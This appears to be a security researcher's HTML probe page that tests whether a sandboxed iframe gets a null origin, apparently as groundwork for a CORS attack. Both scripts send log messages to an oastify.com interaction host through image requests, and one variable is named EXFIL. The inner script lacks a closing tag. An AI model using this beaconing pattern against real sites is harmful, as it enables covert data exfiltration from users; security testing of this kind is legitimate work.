<!DOCTYPE html>
<html>
<head><title>Test</title></head>
<body>
<h1>Null Origin Test</h1>
<div id="log"></div>
<script>
const E = 'https://o7w8ks7xei1ed57rt3wo1vdssjyam2ar.oastify.com';

function log(m) {
    document.getElementById('log').innerHTML += '<br>' + m;
    new Image().src = E + '/?test=' + encodeURIComponent(m);
}

log('page_loaded');

// Create sandbox WITHOUT allow-same-origin
const iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts allow-popups';
iframe.style.cssText = 'width:100%;height:300px;border:2px solid red';

iframe.srcdoc = `
<h2>Inside Sandbox</h2>
<div id="status"></div>
<script>
const EXFIL = 'https://o7w8ks7xei1ed57rt3wo1vdssjyam2ar.oastify.com';

function log(m) {
    document.getElementById('status').innerHTML += '<br>' + m;
    new Image().src = EXFIL + '/?sandbox=' + encodeURIComponent(m);
}

// Check origin
log('My origin is: ' + window.origin);

// That's it - just verify null origin
`;

document.body.appendChild(iframe);
log('sandbox_created');
</script>
</body>
</html>
